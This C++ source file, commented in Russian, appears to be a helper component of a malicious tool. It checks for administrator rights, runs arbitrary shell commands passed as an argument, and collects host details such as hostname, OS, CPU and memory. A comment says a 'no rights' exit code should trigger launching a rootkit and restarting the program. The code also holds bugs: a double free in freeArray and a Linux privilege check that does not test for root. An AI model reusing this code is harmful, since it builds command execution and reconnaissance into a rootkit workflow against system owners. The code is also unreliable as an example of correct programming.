#include <iostream>

#include <getopt.h>

#ifdef LINUX
    #include "unistd.h"
#elif WIN32

    #include <windows.h>
    #include <lmaccess.h>
    #include <lmapibuf.h>
    #include <lm.h>

#endif

/**
 * Это возвращаемое значение, при котором приложение запущено не от имени администратора.
 * В обработчике, после получения этого кода - нужно запустить rootkit, после чего перезапустить наш EXE.
 */
#define NO_RIGHTS 3

/**
 * Массив-мусорка, в которую скинется информация о системе из LINUX.
 */
static char *info_array[4];

/**
 * Простая функция, нужна чтобы выделить память массиву.
 */
void mallocArray() {
    for (auto & i : info_array) {
        i = (char*) malloc(BUFSIZ);
    }
}

/**
 * Простая функция, нужна чтобы освободить память после использования.
 */
void freeArray() {
    for (auto & i : info_array) {
        free(i);
    }

    free(*info_array);
}

/**
 * Функция проверяет есть-ли права администратора у процесса, или нет.
 * @return EXIT_FAILURE/EXIT_SUCCESS
 */
static bool checkAdmin();

/**
 * Функция, которая выполняет переданную команду от имени программы.
 * @param command команда для передачи.
 * @return EXIT_FAILURE -> Ошибка во время выполнения; EXIT_SUCCESS -> Всё прошло успешно.
 */
std::string processCommand(char* command);

/**
 * Выводит информацию о системе на стандартный вывод.
 * @return EXIT_SUCCESS -> Если всё прошло успешно; EXIT_FAILURE -> Произошла ошибка.
 */
bool getInformation();

/**
 * Функция, которая нужна только под LINUX, чтобы получить всю информацию о системе.
 * Пишет информацию в info_array;
 */
void collect_system_info();

/**
 * Точка входа в программу.
 * @param argc кол-во аргументов.
 * @param argv аргументы.
 * @return EXIT CODE.
 */
int main(int argc, char** argv) {

    if (!checkAdmin())
        return NO_RIGHTS;

    int opt;

    while ((opt = getopt(argc, argv, ":c:i")) != -1) {
        if (opt == 'i') {
            return getInformation();
        }else if(opt == 'c') {
            std::cout << processCommand(optarg) << std::endl;
            return EXIT_SUCCESS;
        }
    }

    return EXIT_FAILURE;
}

static bool checkAdmin() {
    bool result = false;
    
    #ifdef LINUX
    auto me = getuid();
    auto myprivs = geteuid();

    result = me == myprivs;
    #elif WIN32
        DWORD rc;
        wchar_t user_name[256];
        USER_INFO_1 *info;
        DWORD size = sizeof( user_name );
        GetUserNameW( user_name, &size);
        rc = NetUserGetInfo( nullptr, user_name, 1, (byte **) &info );
        if ( rc != NERR_Success )
            return result;

        result = info->usri1_priv == USER_PRIV_ADMIN;
        NetApiBufferFree( info );
    #endif

    return result;
}

bool getInformation() {
    #ifdef LINUX
        mallocArray();
        collect_system_info();
        for (auto &i : info_array) {
            printf("%s\n", i);
        }
        freeArray();

        return EXIT_SUCCESS;
    #elif WIN32
        std::cout << processCommand("systeminfo") << std::endl;

        return EXIT_SUCCESS;
    #endif
}

std::string processCommand(char* command) {
    char buffer[BUFSIZ];
    std::string result;

    FILE* pipe = popen(command, "r");

    if (!pipe) throw std::runtime_error("popen() failed!");

    try {
        while (fgets(buffer, sizeof buffer, pipe) != nullptr) {
            result += buffer;
        }
    } catch (...) {
        pclose(pipe);
        exit(EXIT_FAILURE);
    }
    pclose(pipe);

    return result;
}

void collect_system_info() {
    char buffer[BUFSIZ];

    // Get hostname and add it to the info array
    if (gethostname(buffer, BUFSIZ) == 0) {
        sprintf(info_array[0], "Hostname: %s", buffer);
    }

    // Get operating system information and add it to the info array
    if (system("uname -a > tmp.txt") == 0) {
        FILE *fp = fopen("tmp.txt", "r");
        if (fp != nullptr) {
            fgets(buffer, BUFSIZ, fp);
            sprintf(info_array[1], "Operating System: %s", buffer);
            fclose(fp);
        }
        remove("tmp.txt");
    }

    // Get CPU information and add it to the info array
    if (system("cat /proc/cpuinfo > tmp.txt") == 0) {
        FILE *fp = fopen("tmp.txt", "r");
        if (fp != nullptr) {
            fgets(buffer, BUFSIZ, fp);
            sprintf(info_array[2], "CPU Information: %s", buffer);
            fclose(fp);
        }
        remove("tmp.txt");
    }

    // Get memory information and add it to the info array
    if (system("cat /proc/meminfo > tmp.txt") == 0) {
        FILE *fp = fopen("tmp.txt", "r");
        if (fp != nullptr) {
            fgets(buffer, BUFSIZ, fp);
            sprintf(info_array[3], "Memory Information: %s", buffer);
            fclose(fp);
        }
        remove("tmp.txt");
    }
}